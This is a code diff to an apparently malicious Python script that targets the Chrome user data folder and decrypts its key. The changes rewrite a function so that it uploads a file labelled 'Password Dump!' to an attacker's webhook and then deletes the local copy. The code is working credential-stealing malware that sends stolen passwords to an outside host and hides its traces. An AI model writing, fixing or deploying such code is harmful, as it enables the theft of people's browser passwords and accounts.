@@ -15,11 +15,15 @@ CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User 
 
 def sendToWebhook(fileToSend):
     file = open(fileToSend, "rb")
-    # "content": "file",
     data = {
-        "file": (file.name, file.read())
+        "content": "Password Dump!",
     }
-    post(webhookURL, data=data)
+    files = {
+        "file": (fileToSend, file),
+    }
+    post(webhookURL, data=data, files=files)
+    file.close()
+    os.remove(os.path.abspath(file.name))
 
 def getChromeDencryptionKey():
     if not os.path.exists(f"{CHROMEPATH}\\Local State"): return
